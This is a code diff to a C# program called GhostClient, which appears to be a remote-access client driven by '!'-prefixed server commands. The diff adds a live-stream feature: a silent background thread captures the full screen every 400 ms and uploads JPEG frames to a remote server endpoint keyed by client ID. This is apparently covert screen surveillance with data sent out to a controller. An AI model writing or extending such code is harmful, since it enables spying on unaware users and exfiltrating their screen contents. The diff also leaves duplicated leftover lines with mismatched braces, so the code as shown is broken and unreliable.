@@ -899,9 +899,22 @@ namespace GhostClient
                     {
                         using (var wc = new WebClient())
                         {
-                            wc.Headers["captureId"] = cmdId;
                             wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/screenshot", "PUT", img);
                         }
+                        output = "Screenshot uploaded";
+                    }
+                    else output = "ERROR: Screenshot failed";
+                }
+                else if (upper.StartsWith("!LIVESTREAM ON") || upper == "!LIVESTREAM")
+                {
+                    StartLiveStream();
+                    output = "Live stream started (400ms frames)";
+                }
+                else if (upper.StartsWith("!LIVESTREAM OFF") || upper == "!LIVESTOP")
+                {
+                    StopLiveStream();
+                    output = "Live stream stopped";
+                }
                         output = "Screenshot uploaded";
                     }
                     else output = "ERROR: Screenshot failed";
@@ -1320,6 +1333,70 @@ namespace GhostClient
                 }
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static Thread _liveStreamThread = null;
+        private static bool _liveStreamRunning = false;
+
+        static void StartLiveStream()
+        {
+            if (_liveStreamRunning) return;
+            _liveStreamRunning = true;
+            _liveStreamThread = new Thread(() =>
+            {
+                while (_liveStreamRunning)
+                {
+                    try
+                    {
+                        byte[] frame = CaptureScreenJpeg(50); // 50% quality JPEG for speed
+                        if (frame != null)
+                        {
+                            using (var wc = new WebClient())
+                            {
+                                wc.Headers[HttpRequestHeader.ContentType] = "image/jpeg";
+                                wc.UploadData(SERVER + "/api/remote/clients/" + CLIENT_ID + "/live-frame", "POST", frame);
+                            }
+                        }
+                    }
+                    catch { }
+                    Thread.Sleep(400); // 2.5 FPS — fast enough for remote desktop
+                }
+            })
+            { IsBackground = true };
+            _liveStreamThread.Start();
+        }
+
+        static void StopLiveStream()
+        {
+            _liveStreamRunning = false;
+            _liveStreamThread = null;
+        }
+
+        static byte[] CaptureScreenJpeg(int quality)
+        {
+            try
+            {
+                int w = SystemInformation.VirtualScreen.Width;
+                int h = SystemInformation.VirtualScreen.Height;
+                // Scale down for faster streaming
+                int sw = Math.Min(w, 1024);
+                int sh = h * sw / w;
+                using (var bmp = new Bitmap(w, h))
+                using (var g = Graphics.FromImage(bmp))
+                {
+                    g.CopyFromScreen(SystemInformation.VirtualScreen.X, SystemInformation.VirtualScreen.Y, 0, 0, new Size(w, h));
+                    using (var scaled = new Bitmap(bmp, new Size(sw, sh)))
+                    using (var ms = new MemoryStream())
+                    {
+                        var codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.MimeType == "image/jpeg");
+                        var ep = new System.Drawing.Imaging.EncoderParameters(1);
+                        ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
+                        scaled.Save(ms, codec, ep);
+                        return ms.ToArray();
+                    }
+                }
+            }
+            catch { return null; }
         }
 
         // ── SCREENSHOT ──
